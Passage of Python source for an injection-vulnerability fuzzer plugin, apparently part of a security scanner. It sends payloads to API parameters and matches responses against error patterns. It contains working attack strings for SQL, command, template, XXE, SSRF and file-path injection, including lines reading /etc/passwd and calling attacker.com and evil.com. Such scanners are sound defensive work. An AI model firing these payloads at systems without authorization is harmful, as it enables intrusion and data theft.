"""Payload Fuzzer - Enterprise-grade injection vulnerability testing"""
import re
import logging
import hashlib
import asyncio
import json
from datetime import datetime
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse, quote

from apiguardian.core.plugin_manager import FuzzerPlugin
from apiguardian.utils.http_client import safe_http_client, HTTPResponse

logger = logging.getLogger(__name__)


class InjectionType(Enum):
    """Types of injection vulnerabilities"""
    SQL_INJECTION = "sqli"
    NOSQL_INJECTION = "nosqli"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    COMMAND_INJECTION = "cmdi"
    LDAP_INJECTION = "ldapi"
    XPATH_INJECTION = "xpathi"
    SSTI = "ssti"
    SSRF = "ssrf"
    LFI = "lfi"
    RFI = "rfi"
    XXE = "xxe"
    HEADER_INJECTION = "headeri"
    CRLF_INJECTION = "crlf"
    LOG_INJECTION = "logi"
    JSON_INJECTION = "jsoni"


class InjectionRisk(Enum):
    """Risk levels for injection vulnerabilities"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class InjectionPoint:
    """Represents a potential injection point"""
    location: str  # query, path, body, header, cookie
    parameter_name: str
    original_value: str
    parameter_type: str = "string"  # string, numeric, array, object
    is_sensitive: bool = False


@dataclass
class InjectionTestResult:
    """Result of an injection test"""
    injection_type: InjectionType
    payload: str
    response_code: int
    response_time: float
    response_size: int
    indicators_found: List[str]
    is_vulnerable: bool
    confidence: float
    response_snippet: str = ""


@dataclass
class InjectionVulnerability:
    """Represents a detected injection vulnerability"""
    injection_type: InjectionType
    risk_level: InjectionRisk
    endpoint: str
    method: str
    injection_point: InjectionPoint
    test_result: InjectionTestResult
    evidence: str
    confidence: float


# CWE mappings for injection vulnerabilities
INJECTION_CWE_MAPPINGS = {
    InjectionType.SQL_INJECTION: {
        'id': 'CWE-89',
        'name': 'SQL Injection',
        'cvss_base': 9.8
    },
    InjectionType.NOSQL_INJECTION: {
        'id': 'CWE-943',
        'name': 'Improper Neutralization of Special Elements in Data Query Logic',
        'cvss_base': 9.0
    },
    InjectionType.XSS_REFLECTED: {
        'id': 'CWE-79',
        'name': 'Cross-site Scripting (XSS)',
        'cvss_base': 6.1
    },
    InjectionType.XSS_STORED: {
        'id': 'CWE-79',
        'name': 'Cross-site Scripting (XSS)',
        'cvss_base': 7.5
    },
    InjectionType.XSS_DOM: {
        'id': 'CWE-79',
        'name': 'Cross-site Scripting (XSS)',
        'cvss_base': 6.1
    },
    InjectionType.COMMAND_INJECTION: {
        'id': 'CWE-78',
        'name': 'OS Command Injection',
        'cvss_base': 10.0
    },
    InjectionType.LDAP_INJECTION: {
        'id': 'CWE-90',
        'name': 'LDAP Injection',
        'cvss_base': 8.0
    },
    InjectionType.XPATH_INJECTION: {
        'id': 'CWE-91',
        'name': 'XPath Injection',
        'cvss_base': 7.5
    },
    InjectionType.SSTI: {
        'id': 'CWE-1336',
        'name': 'Server-Side Template Injection',
        'cvss_base': 9.8
    },
    InjectionType.SSRF: {
        'id': 'CWE-918',
        'name': 'Server-Side Request Forgery',
        'cvss_base': 8.5
    },
    InjectionType.LFI: {
        'id': 'CWE-22',
        'name': 'Path Traversal',
        'cvss_base': 7.5
    },
    InjectionType.RFI: {
        'id': 'CWE-98',
        'name': 'Remote File Inclusion',
        'cvss_base': 9.8
    },
    InjectionType.XXE: {
        'id': 'CWE-611',
        'name': 'XML External Entity (XXE)',
        'cvss_base': 9.0
    },
    InjectionType.HEADER_INJECTION: {
        'id': 'CWE-113',
        'name': 'HTTP Response Splitting',
        'cvss_base': 6.1
    },
    InjectionType.CRLF_INJECTION: {
        'id': 'CWE-93',
        'name': 'CRLF Injection',
        'cvss_base': 6.1
    },
    InjectionType.LOG_INJECTION: {
        'id': 'CWE-117',
        'name': 'Log Injection',
        'cvss_base': 5.3
    },
    InjectionType.JSON_INJECTION: {
        'id': 'CWE-94',
        'name': 'Code Injection',
        'cvss_base': 7.5
    }
}


# Comprehensive payload sets
INJECTION_PAYLOADS = {
    InjectionType.SQL_INJECTION: [
        # Error-based
        "'",
        "''",
        "`",
        "\"",
        "'--",
        "';--",
        "\"--",
        # Boolean-based blind
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "1' OR '1'='1",
        "admin'--",
        "admin' #",
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1 UNION SELECT 1,2,3--",
        "1 UNION ALL SELECT 1,2,3--",
        # Time-based blind
        "'; WAITFOR DELAY '0:0:5'--",
        "' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
        # Stacked queries
        "'; DROP TABLE users--",
        "'; SELECT * FROM users--",
        "1; SELECT * FROM information_schema.tables--",
        # MySQL specific
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(@@version,1,1)='5",
        # PostgreSQL specific
        "'; SELECT pg_sleep(5)--",
        "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
        # MSSQL specific
        "'; EXEC xp_cmdshell('whoami')--",
        "'; EXEC sp_configure 'show advanced options',1--",
        # Oracle specific
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
        "' AND ROWNUM=1--",
        # Generic
        "1 OR 1=1",
        "1' OR 1=1#",
        "1 AND 1=1",
        "1 AND 1=2"
    ],
    InjectionType.NOSQL_INJECTION: [
        # MongoDB
        '{"$gt":""}',
        '{"$ne":""}',
        '{"$regex":".*"}',
        '{"$where":"1==1"}',
        "';return(true);var x='",
        '{"$or":[{},{"a":"a"}]}',
        '[$ne]=1',
        '{"username":{"$gt":""},"password":{"$gt":""}}',
        # Common NoSQL
        'true, $where: "1 == 1"',
        ', $or: [{}, {"a":"a"}]',
        '\' || \'1\'==\'1',
        '{"$gt": ""}',
        '{"$nin": []}',
        '{"$exists": true}'
    ],
    InjectionType.XSS_REFLECTED: [
        # Basic
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '<script>alert(document.domain)</script>',
        # Event handlers
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        '<div onmouseover=alert(1)>test</div>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        # JavaScript URIs
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        '<a href="javascript:alert(1)">click</a>',
        # Breaking out of attributes
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        # Encoded payloads
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        # Bypass filters
        '<ScRiPt>alert(1)</ScRiPt>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<script/src="data:,alert(1)">',
        '<script>al\\u0065rt(1)</script>',
        # SVG-based
        '<svg><script>alert(1)</script></svg>',
        '<svg/onload=alert(1)>',
        # Polyglots
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//</stYle></titLe></teXtarEa></scRipt>--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e'
    ],
    InjectionType.COMMAND_INJECTION: [
        # Unix
        '; id',
        '| id',
        '|| id',
        '`id`',
        '$(id)',
        '; whoami',
        '| whoami',
        '& whoami',
        '&& whoami',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',
        # Windows
        '& dir',
        '| dir',
        '; dir',
        '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
        '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
        # Command chaining
        ';ls -la',
        '|ls -la',
        '||ls -la',
        '&&ls -la',
        # Newline injection
        '%0Aid',
        '%0Dwhoami',
        '\nid',
        '\r\nwhoami',
        # Bypass attempts
        ';{id}',
        '|{id}',
        '$({id})',
        '\';id;\'',
        '\";id;\"'
    ],
    InjectionType.SSTI: [
        # Jinja2/Python
        '{{7*7}}',
        '${7*7}',
        '{{config}}',
        '{{self.__class__.__mro__}}',
        '{{request.application.__globals__}}',
        '{{"".__class__.__mro__[1].__subclasses__()}}',
        # Twig/PHP
        '{{_self.env.registerUndefinedFilterCallback("exec")}}',
        '{{_self.env.getFilter("id")}}',
        # Freemarker/Java
        '${7*7}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>',
        '${ex("id")}',
        # Velocity/Java
        '#set($x=7*7)$x',
        '#set($str=$class.forName("java.lang.String"))',
        # Smarty/PHP
        '{php}echo "test";{/php}',
        '{literal}{/literal}<script>alert(1)</script>',
        # ERB/Ruby
        '<%= 7*7 %>',
        '<%= system("id") %>',
        # Generic
        '{{constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id").toString()}}',
        '${T(java.lang.Runtime).getRuntime().exec("id")}'
    ],
    InjectionType.LFI: [
        # Basic
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\etc\\passwd',
        '/etc/passwd',
        '/etc/shadow',
        # Windows
        '..\\..\\..\\windows\\system.ini',
        '..\\..\\..\\windows\\win.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\boot.ini',
        # URL encoding
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        # Null byte
        '../../../etc/passwd%00',
        '../../../etc/passwd%00.png',
        # Wrappers
        'file:///etc/passwd',
        'php://filter/convert.base64-encode/resource=../../../etc/passwd',
        'php://input',
        'data://text/plain,<?php system("id"); ?>',
        'expect://id',
        # Double encoding
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd'
    ],
    InjectionType.SSRF: [
        # Localhost
        'http://127.0.0.1',
        'http://localhost',
        'http://127.0.0.1:80',
        'http://127.0.0.1:443',
        'http://127.0.0.1:22',
        # Cloud metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/metadata/instance',
        # Internal networks
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://172.16.0.1',
        # DNS rebinding
        'http://localtest.me',
        'http://127.0.0.1.nip.io',
        # Protocol handlers
        'file:///etc/passwd',
        'dict://127.0.0.1:11211/info',
        'gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aPING%0d%0a',
        # URL parsing bypass
        'http://127.0.0.1:80@evil.com',
        'http://evil.com@127.0.0.1',
        'http://127.0.0.1#@evil.com',
        # IPv6
        'http://[::1]',
        'http://[0:0:0:0:0:0:0:1]'
    ],
    InjectionType.XXE: [
        # Basic XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
        # Parameter entities
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo>test</foo>',
        # Blind XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">%dtd;]><foo>&send;</foo>',
        # XInclude
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
    ],
    InjectionType.LDAP_INJECTION: [
        '*',
        '*)(&',
        '*)(|(&',
        '*()|&\'',
        'admin)(&)',
        'admin)(|(password=*))',
        '*)((|userPassword=*)',
        '*)(uid=*))(|(uid=*',
        'x))(|(x=',
        '*))(objectClass=*',
        '*)(cn=*)',
        '*)(!(&(objectClass=Person)(cn=*)))'
    ],
    InjectionType.XPATH_INJECTION: [
        "' or '1'='1",
        "' or ''='",
        "x' or name()='username' or 'x'='y",
        "'] | //user/password | //user['",
        "' or 1=1 or ''='",
        "admin' or '1'='1",
        "') or ('1'='1",
        "' or count(parent::*[position()=1])=0 or ''='"
    ],
    InjectionType.HEADER_INJECTION: [
        'value\r\nX-Injected: header',
        'value\nX-Injected: header',
        'value%0d%0aX-Injected:%20header',
        'value%0aX-Injected:%20header',
        'value\r\n\r\n<html>injected</html>'
    ],
    InjectionType.CRLF_INJECTION: [
        '%0d%0aSet-Cookie:%20injected=true',
        '%0aSet-Cookie:%20injected=true',
        '\r\nSet-Cookie: injected=true',
        '\nSet-Cookie: injected=true',
        '%E5%98%8A%E5%98%8DSet-Cookie:%20injected=true'
    ],
    InjectionType.LOG_INJECTION: [
        '\\n[ERROR] Fake log entry',
        '%0a[ERROR] Fake log entry',
        '\r\n[ERROR] Fake log entry',
        '${jndi:ldap://attacker.com/a}',
        '${${lower:j}ndi:ldap://attacker.com/a}'
    ],
    InjectionType.JSON_INJECTION: [
        '{"__proto__":{"admin":true}}',
        '{"constructor":{"prototype":{"admin":true}}}',
        '"},"admin":true,"x":"',
        '","admin":true}//']
}


# Response indicators for each injection type
INJECTION_INDICATORS = {
    InjectionType.SQL_INJECTION: [
        # MySQL
        re.compile(r'you have an error in your sql syntax', re.I),
        re.compile(r'mysql_fetch', re.I),
        re.compile(r'mysql_num_rows', re.I),
        re.compile(r'mysql_query', re.I),
        re.compile(r'warning.*mysql', re.I),
        re.compile(r'mysqli_', re.I),
        # PostgreSQL
        re.compile(r'pg_query', re.I),
        re.compile(r'pg_exec', re.I),
        re.compile(r'postgresql.*error', re.I),
        re.compile(r'unterminated quoted string', re.I),
        # MSSQL
        re.compile(r'microsoft sql native client', re.I),
        re.compile(r'unclosed quotation mark', re.I),
        re.compile(r'quoted string not properly terminated', re.I),
        re.compile(r'\[microsoft\]\[odbc', re.I),
        re.compile(r'mssql_query', re.I),
        # Oracle
        re.compile(r'ora-\d{5}', re.I),
        re.compile(r'oracle.*error', re.I),
        re.compile(r'oci_execute', re.I),
        # SQLite
        re.compile(r'sqlite3_', re.I),
        re.compile(r'sqlite.*error', re.I),
        # Generic
        re.compile(r'sql syntax', re.I),
        re.compile(r'syntax error.*sql', re.I),
        re.compile(r'invalid query', re.I),
        re.compile(r'error in.*query', re.I)
    ],
    InjectionType.NOSQL_INJECTION: [
        re.compile(r'mongodb.*error', re.I),
        re.compile(r'cannot read property', re.I),
        re.compile(r'bson.*error', re.I),
        re.compile(r'unexpected token', re.I),
        re.compile(r'json parse error', re.I)
    ],
    InjectionType.XSS_REFLECTED: [
        re.compile(r'<script.*?>.*?</script>', re.I | re.S),
        re.compile(r'javascript:', re.I),
        re.compile(r'onerror\s*=', re.I),
        re.compile(r'onload\s*=', re.I),
        re.compile(r'onmouseover\s*=', re.I),
        re.compile(r'<img[^>]+onerror', re.I),
        re.compile(r'<svg[^>]+onload', re.I)
    ],
    InjectionType.COMMAND_INJECTION: [
        re.compile(r'root:.*?:0:0:', re.I),
        re.compile(r'uid=\d+.*gid=\d+', re.I),
        re.compile(r'www-data', re.I),
        re.compile(r'/bin/bash', re.I),
        re.compile(r'sh: \d+:', re.I),
        re.compile(r'command not found', re.I),
        re.compile(r'permission denied', re.I),
        re.compile(r'\[boot loader\]', re.I),
        re.compile(r'volume serial number', re.I)
    ],
    InjectionType.SSTI: [
        re.compile(r'49', re.I),  # 7*7
        re.compile(r'jinja2', re.I),
        re.compile(r'mako', re.I),
        re.compile(r'freemarker', re.I),
        re.compile(r'velocity', re.I),
        re.compile(r'template.*error', re.I),
        re.compile(r'<class.*?>', re.I)
    ],
    InjectionType.LFI: [
        re.compile(r'root:.*?:0:0:', re.I),
        re.compile(r'/bin/bash', re.I),
        re.compile(r'/usr/sbin/nologin', re.I),
        re.compile(r'\[boot loader\]', re.I),
        re.compile(r'\[fonts\]', re.I),
        re.compile(r'for 16-bit app support', re.I),
        re.compile(r'failed to open stream', re.I)
    ],
    InjectionType.SSRF: [
        re.compile(r'ami-id', re.I),
        re.compile(r'instance-id', re.I),
        re.compile(r'instance-type', re.I),
        re.compile(r'local-hostname', re.I),
        re.compile(r'security-credentials', re.I),
        re.compile(r'connection refused', re.I),
        re.compile(r'couldn\'t connect to host', re.I)
    ],
    InjectionType.XXE: [
        re.compile(r'root:.*?:0:0:', re.I),
        re.compile(r'/bin/bash', re.I),
        re.compile(r'xml parsing error', re.I),
        re.compile(r'entity.*not defined', re.I),
        re.compile(r'doctype.*not allowed', re.I)
    ]
}


class PayloadFuzzer(FuzzerPlugin):
    """Enterprise-grade injection vulnerability fuzzer"""

    plugin_name = "payload_fuzzer"
    description = "Comprehensive injection vulnerability testing with intelligent payload selection and response analysis"
    version = "2.0.0"
    destructive = False  # Safe by default

    def __init__(self, config: Dict[str, Any] = None):
        """Initialize the payload fuzzer"""
        super().__init__(config)
        self.config = config or {}
        self.tested_points: Set[str] = set()
        self.findings_cache: Dict[str, List[Dict]] = {}
        self.request_delay = 0.1  # Delay between requests

    async def fuzz(self, target: str, context: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Fuzz target for injection vulnerabilities"""
        findings = []

        logger.info(f"Starting injection fuzzing for target: {target}")

        # Get configuration
        config = context.get('config', {})
        fuzzer_config = config.get('fuzzers', {}).get('payload', {})

        # Configuration options
        max_payloads = fuzzer_config.get('max_payloads', 50)
        injection_types = fuzzer_config.get('injection_types', None)  # None = all types
        test_all_params = fuzzer_config.get('test_all_params', True)

        # Get endpoints to test
        endpoints = context.get('endpoints', [])
        if not endpoints and target:
            endpoints = [{'url': target, 'method': 'GET'}]

        logger.info(f"Fuzzing {len(endpoints)} endpoints for injection vulnerabilities")

        # Test each endpoint
        for endpoint_info in endpoints:
            url = endpoint_info.get('url', '')
            method = endpoint_info.get('method', 'GET').upper()
            headers = endpoint_info.get('headers', {})
            body = endpoint_info.get('body', {})

            if not url:
                continue

            # Find injection points
            injection_points = self._find_injection_points(url, method, body, headers)

            if not injection_points:
                continue

            logger.debug(f"Found {len(injection_points)} injection points in {url}")

            # Test each injection point
            for point in injection_points:
                if not test_all_params and not point.is_sensitive:
                    continue

                # Skip already tested points
                point_key = f"{url}:{point.location}:{point.parameter_name}"
                if point_key in self.tested_points:
                    continue
                self.tested_points.add(point_key)

                # Test with appropriate injection types
                point_findings = await self._test_injection_point(
                    url, method, point, headers, body,
                    max_payloads, injection_types, context
                )
                findings.extend(point_findings)

        # Add summary if no vulnerabilities found
        if not findings:
            findings.append(self._create_no_vuln_finding(target, len(endpoints), context))

        logger.info(f"Injection fuzzing complete. Found {len(findings)} findings")

        return findings

    def _find_injection_points(
        self,
        url: str,
        method: str,
        body: Dict,
        headers: Dict
    ) -> List[InjectionPoint]:
        """Find all potential injection points"""
        points = []

        # Parse URL for query parameters
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)

        for param, values in query_params.items():
            value = values[0] if values else ''
            points.append(InjectionPoint(
                location='query',
                parameter_name=param,
                original_value=value,
                parameter_type=self._detect_param_type(value),
                is_sensitive=self._is_sensitive_param(param)
            ))

        # Parse URL path for path parameters
        path_parts = parsed.path.split('/')
        for i, part in enumerate(path_parts):
            if part and (part.isdigit() or self._looks_like_id(part)):
                points.append(InjectionPoint(
                    location='path',
                    parameter_name=f'path_{i}',
                    original_value=part,
                    parameter_type='path',
                    is_sensitive=True
                ))

        # Parse body for parameters
        if body and isinstance(body, dict):
            body_points = self._find_body_injection_points(body)
            points.extend(body_points)

        # Check headers for injection points
        injectable_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Custom-Header']
        for header in injectable_headers:
            if header in headers:
                points.append(InjectionPoint(
                    location='header',
                    parameter_name=header,
                    original_value=headers[header],
                    parameter_type='string',
                    is_sensitive=False
                ))

        return points

    def _find_body_injection_points(self, body: Dict, prefix: str = '') -> List[InjectionPoint]:
        """Recursively find injection points in request body"""
        points = []

        for key, value in body.items():
            full_key = f"{prefix}.{key}" if prefix else key

            if isinstance(value, dict):
                points.extend(self._find_body_injection_points(value, full_key))
            elif isinstance(value, list):
                for i, item in enumerate(value):
                    if isinstance(item, dict):
                        points.extend(self._find_body_injection_points(item, f"{full_key}[{i}]"))
                    else:
                        points.append(InjectionPoint(
                            location='body',
                            parameter_name=f"{full_key}[{i}]",
                            original_value=str(item),
                            parameter_type='array_item',
                            is_sensitive=self._is_sensitive_param(key)
                        ))
            else:
                points.append(InjectionPoint(
                    location='body',
                    parameter_name=full_key,
                    original_value=str(value) if value else '',
                    parameter_type=self._detect_param_type(value),
                    is_sensitive=self._is_sensitive_param(key)
                ))

        return points

    def _detect_param_type(self, value: Any) -> str:
        """Detect parameter type"""
        if value is None:
            return 'null'
        elif isinstance(value, bool):
            return 'boolean'
        elif isinstance(value, int):
            return 'integer'
        elif isinstance(value, float):
            return 'float'
        elif isinstance(value, str):
            if value.isdigit():
                return 'numeric_string'
            return 'string'
        elif isinstance(value, list):
            return 'array'
        elif isinstance(value, dict):
            return 'object'
        return 'unknown'

    def _is_sensitive_param(self, param_name: str) -> bool:
        """Check if parameter is sensitive (higher priority for testing)"""
        sensitive_patterns = [
            'id', 'user', 'name', 'search', 'query', 'q', 'filter',
            'file', 'path', 'url', 'page', 'redirect', 'callback',
            'data', 'input', 'value', 'param', 'cmd', 'exec'
        ]
        param_lower = param_name.lower()
        return any(pattern in param_lower for pattern in sensitive_patterns)

    def _looks_like_id(self, value: str) -> bool:
        """Check if value looks like an ID"""
        if not value:
            return False
        # UUID
        if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', value, re.I):
            return True
        # MongoDB ObjectId
        if re.match(r'^[0-9a-f]{24}$', value, re.I):
            return True
        # Numeric ID
        if value.isdigit():
            return True
        return False

    async def _test_injection_point(
        self,
        url: str,
        method: str,
        point: InjectionPoint,
        headers: Dict,
        body: Dict,
        max_payloads: int,
        injection_types: Optional[List[str]],
        context: Dict
    ) -> List[Dict]:
        """Test a specific injection point"""
        findings = []

        # Determine which injection types to test
        types_to_test = self._select_injection_types(point, injection_types)

        # Calculate payloads per type
        payloads_per_type = max(1, max_payloads // len(types_to_test))

        for inj_type in types_to_test:
            payloads = INJECTION_PAYLOADS.get(inj_type, [])[:payloads_per_type]

            for payload in payloads:
                result = await self._send_payload(
                    url, method, point, payload, inj_type, headers, body, context
                )

                if result and result.is_vulnerable:
                    vuln = InjectionVulnerability(
                        injection_type=inj_type,
                        risk_level=self._get_risk_level(inj_type, result.confidence),
                        endpoint=url,
                        method=method,
                        injection_point=point,
                        test_result=result,
                        evidence=f"Indicators found: {', '.join(result.indicators_found[:3])}",
                        confidence=result.confidence
                    )
                    findings.append(self._create_finding(vuln, context))

                    # Stop testing this type after finding vulnerability
                    break

                # Rate limiting
                await asyncio.sleep(self.request_delay)

        return findings

    def _select_injection_types(
        self,
        point: InjectionPoint,
        requested_types: Optional[List[str]]
    ) -> List[InjectionType]:
        """Select appropriate injection types based on context"""
        if requested_types:
            return [InjectionType(t) for t in requested_types if t in [e.value for e in InjectionType]]

        # Default selection based on parameter context
        types = []

        # Always test SQL injection
        types.append(InjectionType.SQL_INJECTION)

        # Test XSS for string parameters
        if point.parameter_type in ['string', 'numeric_string']:
            types.append(InjectionType.XSS_REFLECTED)

        # Test command injection for sensitive params
        if point.is_sensitive or any(x in point.parameter_name.lower() for x in ['cmd', 'exec', 'command', 'shell']):
            types.append(InjectionType.COMMAND_INJECTION)

        # Test LFI for file-related params
        if any(x in point.parameter_name.lower() for x in ['file', 'path', 'page', 'template', 'include']):
            types.append(InjectionType.LFI)
            types.append(InjectionType.SSTI)

        # Test SSRF for URL params
        if any(x in point.parameter_name.lower() for x in ['url', 'uri', 'link', 'redirect', 'callback', 'webhook']):
            types.append(InjectionType.SSRF)

        # Test NoSQL for JSON body params
        if point.location == 'body':
            types.append(InjectionType.NOSQL_INJECTION)
            types.append(InjectionType.JSON_INJECTION)

        # Test header injection for header params
        if point.location == 'header':
            types.append(InjectionType.HEADER_INJECTION)
            types.append(InjectionType.CRLF_INJECTION)

        return list(set(types))

    async def _send_payload(
        self,
        url: str,
        method: str,
        point: InjectionPoint,
        payload: str,
        inj_type: InjectionType,
        headers: Dict,
        body: Dict,
        context: Dict
    ) -> Optional[InjectionTestResult]:
        """Send payload and analyze response"""
        try:
            # Create modified request
            modified_url, modified_headers, modified_body = self._inject_payload(
                url, point, payload, headers, body
            )

            # Only GET requests unless destructive mode enabled
            if method != 'GET' and not context.get('enable_destructive', False):
                # For non-GET, just return pattern-based detection
                return self._pattern_based_detection(point, payload, inj_type)

            async with safe_http_client(context.get('config', {})) as client:
                start_time = datetime.now()

                if method == 'GET':
                    response = await client.get(modified_url, headers=modified_headers)
                elif method == 'POST':
                    response = await client.post(modified_url, headers=modified_headers, json=modified_body)
                else:
                    response = await client.request(method, modified_url, headers=modified_headers, json=modified_body)

                response_time = (datetime.now() - start_time).total_seconds()
                content = await response.text() if hasattr(response, 'text') else str(response.content)

                # Analyze response
                indicators = self._find_indicators(content, inj_type)
                is_vulnerable = len(indicators) > 0

                # Check for payload reflection (XSS)
                if inj_type in [InjectionType.XSS_REFLECTED, InjectionType.XSS_DOM]:
                    if payload.lower() in content.lower():
                        indicators.append('payload_reflected')
                        is_vulnerable = True

                # Calculate confidence
                confidence = self._calculate_confidence(indicators, response.status_code, inj_type)

                return InjectionTestResult(
                    injection_type=inj_type,
                    payload=payload,
                    response_code=response.status_code,
                    response_time=response_time,
                    response_size=len(content),
                    indicators_found=indicators,
                    is_vulnerable=is_vulnerable,
                    confidence=confidence,
                    response_snippet=content[:500] if is_vulnerable else ''
                )

        except Exception as e:
            logger.debug(f"Error sending payload: {e}")
            return None

    def _inject_payload(
        self,
        url: str,
        point: InjectionPoint,
        payload: str,
        headers: Dict,
        body: Dict
    ) -> Tuple[str, Dict, Dict]:
        """Inject payload into the appropriate location"""
        modified_headers = headers.copy()
        modified_body = body.copy() if body else {}

        if point.location == 'query':
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[point.parameter_name] = [payload]
            new_query = urlencode(params, doseq=True)
            modified_url = urlunparse(parsed._replace(query=new_query))

        elif point.location == 'path':
            parsed = urlparse(url)
            path_parts = parsed.path.split('/')
            # Replace the appropriate path segment
            part_index = int(point.parameter_name.split('_')[1])
            if part_index < len(path_parts):
                path_parts[part_index] = quote(payload, safe='')
            new_path = '/'.join(path_parts)
            modified_url = urlunparse(parsed._replace(path=new_path))

        elif point.location == 'body':
            modified_url = url
            # Navigate to nested key and modify
            keys = point.parameter_name.replace('[', '.').replace(']', '').split('.')
            current = modified_body
            for key in keys[:-1]:
                if key not in current:
                    current[key] = {}
                current = current[key]
            current[keys[-1]] = payload

        elif point.location == 'header':
            modified_url = url
            modified_headers[point.parameter_name] = payload

        else:
            modified_url = url

        return modified_url, modified_headers, modified_body

    def _pattern_based_detection(
        self,
        point: InjectionPoint,
        payload: str,
        inj_type: InjectionType
    ) -> InjectionTestResult:
        """Pattern-based detection when active testing not possible"""
        # Check if the payload is suspicious enough to warrant flagging
        is_suspicious = False
        indicators = []

        if inj_type == InjectionType.SQL_INJECTION:
            if any(x in payload.lower() for x in ["'", '"', '--', ';', 'union', 'select']):
                indicators.append('suspicious_sql_payload')
                is_suspicious = point.is_sensitive

        elif inj_type == InjectionType.COMMAND_INJECTION:
            if any(x in payload for x in [';', '|', '`', '$(']):
                indicators.append('suspicious_command_payload')
                is_suspicious = point.is_sensitive

        return InjectionTestResult(
            injection_type=inj_type,
            payload=payload,
            response_code=0,
            response_time=0,
            response_size=0,
            indicators_found=indicators,
            is_vulnerable=is_suspicious,
            confidence=0.3 if is_suspicious else 0.0
        )

    def _find_indicators(self, content: str, inj_type: InjectionType) -> List[str]:
        """Find vulnerability indicators in response"""
        indicators = []
        patterns = INJECTION_INDICATORS.get(inj_type, [])

        for pattern in patterns:
            match = pattern.search(content)
            if match:
                indicators.append(match.group(0)[:50])  # Truncate long matches

        return indicators

    def _calculate_confidence(
        self,
        indicators: List[str],
        status_code: int,
        inj_type: InjectionType
    ) -> float:
        """Calculate confidence score for vulnerability"""
        if not indicators:
            return 0.0

        base_confidence = 0.5

        # More indicators = higher confidence
        base_confidence += min(len(indicators) * 0.15, 0.3)

        # Certain status codes increase confidence
        if status_code == 500:
            base_confidence += 0.1
        elif status_code == 200:
            base_confidence += 0.05

        # Some injection types are more certain
        if inj_type in [InjectionType.COMMAND_INJECTION, InjectionType.SQL_INJECTION]:
            base_confidence += 0.05

        return min(base_confidence, 1.0)

    def _get_risk_level(self, inj_type: InjectionType, confidence: float) -> InjectionRisk:
        """Determine risk level based on injection type and confidence"""
        high_risk_types = [
            InjectionType.SQL_INJECTION,
            InjectionType.COMMAND_INJECTION,
            InjectionType.RFI,
            InjectionType.XXE,
            InjectionType.SSTI
        ]

        if inj_type in high_risk_types:
            if confidence >= 0.7:
                return InjectionRisk.CRITICAL
            elif confidence >= 0.5:
                return InjectionRisk.HIGH
            else:
                return InjectionRisk.MEDIUM
        else:
            if confidence >= 0.7:
                return InjectionRisk.HIGH
            elif confidence >= 0.5:
